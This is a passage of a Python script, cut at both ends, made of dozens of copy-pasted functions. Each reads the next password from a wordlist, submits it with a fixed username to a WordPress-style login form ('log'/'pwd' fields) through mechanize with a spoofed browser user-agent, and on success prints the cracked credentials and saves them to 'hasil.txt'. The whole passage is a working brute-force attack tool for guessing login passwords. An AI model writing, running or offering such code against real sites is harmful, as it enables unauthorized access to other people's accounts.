    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x50():
    w1=k50.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x51():
    w1=k51.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x52():
    w1=k52.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x53():
    w1=k53.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x54():
    w1=k54.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x55():
    w1=k55.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x56():
    w1=k56.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x57():
    w1=k57.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x58():
    w1=k58.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x59():
    w1=k59.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x60():
    w1=k60.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x61():
    w1=k61.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x62():
    w1=k62.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x63():
    w1=k63.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x64():
    w1=k64.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x65():
    w1=k65.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x66():
    w1=k66.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x67():
    w1=k67.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x68():
    w1=k68.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x69():
    w1=k69.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x70():
    w1=k70.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x71():
    w1=k71.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x72():
    w1=k72.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x73():
    w1=k73.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x74():
    w1=k74.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x75():
    w1=k75.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x76():
    w1=k76.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x77():
    w1=k77.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x78():
    w1=k78.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x79():
    w1=k79.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x80():
    w1=k80.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x81():
    w1=k81.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x82():
    w1=k82.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x83():
    w1=k83.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
